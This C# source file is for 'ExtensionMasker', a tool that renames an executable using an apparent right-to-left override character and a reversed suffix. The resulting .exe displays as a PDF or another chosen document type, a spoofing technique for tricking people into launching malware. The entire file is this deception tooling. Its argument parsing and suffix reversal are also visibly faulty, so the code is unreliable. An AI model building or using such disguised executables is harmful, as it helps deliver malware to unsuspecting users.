using ExtensionMasker.Types;

namespace ExtensionMasker
{
    class Program
    {
        public static void Main(params string[] args)
        {
            string? fromfile = null;
            string outname = $"proof_of_concept_{Constants.reverseSeq}fdp.exe";

            string customfirstname = "";
            string suff = "";
            bool iscustomsuffix = false;

            for(int i = 0; i < args.Length; i++)
            {
                switch(args[i])
                {
                    case "--file": case "-f":
                    {
                        fromfile = args[i + 1];
                        i = i + 2;
                        continue;
                    }

                    //this must be entered without the extension
                    case "--name": case "-n":
                    {
                        customfirstname = args[i + 1];
                        i = i + 2;
                        continue;
                    }

                    case "--suffix": case "-s":
                    {
                        iscustomsuffix = true;
                        suff = args[i + 1];

                        i = i + 2;
                        continue;
                    }
                }

                if(iscustomsuffix && customfirstname != "")
                {
                    outname = BuildFilenameSuffixCustom(customfirstname, suff);
                } else if(!iscustomsuffix && customfirstname != "")
                {
                    outname = BuildFilenameSuffix(customfirstname);
                }

                if(fromfile != null)
                {
                    FileBuilder.BuildFrom(outname, File.ReadAllBytes(fromfile));
                } else {
                    throw new Exception("-f/--file flags are required!");
                }
            }
        }

        public static string BuildFilenameSuffix(string prefix)
        {
            string name = prefix;
            name = name + $"{Constants.reverseSeq}fdp.exe";
            return name;
        }

        public static string BuildFilenameSuffixCustom(string prefix, string targetSuffix)
        {
            string name = prefix;
            name = name + $"{Constants.reverseSeq}{targetSuffix.Reverse()}.exe";
            return name;
        }
    }
}